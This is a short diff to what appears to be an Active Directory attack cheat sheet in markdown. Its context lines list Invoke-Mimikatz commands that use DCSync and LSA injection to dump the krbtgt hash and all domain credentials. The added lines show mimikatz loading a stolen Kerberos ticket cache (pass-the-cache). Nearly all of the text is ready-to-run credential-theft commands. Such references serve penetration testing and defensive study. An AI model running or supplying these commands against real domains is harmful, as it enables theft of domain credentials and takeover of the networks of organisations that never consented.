@@ -67,3 +67,11 @@
 |Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
 |Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
+
+
+Then use `mimikatz` to load the ticket.
+
+```powershell
+mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
+```
+
